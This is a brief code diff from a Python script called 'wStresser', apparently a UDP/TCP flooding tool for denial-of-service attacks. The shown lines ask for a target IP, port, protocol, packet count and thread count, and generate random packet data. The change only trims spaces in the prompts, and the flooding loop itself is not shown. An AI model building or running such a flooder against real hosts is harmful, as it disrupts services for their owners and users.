@@ -5,11 +5,11 @@ import threading
 
 print("-> wStresser <-")
 print("-> By wasuna6 <-")
-ip = str(input(" IP: "))
-port = int(input(" Port: "))
-choice = str(input(" 1(UDP)2(TCP): "))
-times = int(input(" Pakiety: "))
-threads = int(input(" Drop :"))
+ip = str(input(" IP:"))
+port = int(input(" Port:"))
+choice = str(input(" 1(UDP)2(TCP):"))
+times = int(input(" Pakiety:"))
+threads = int(input(" Drop:"))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("->","->","->"))
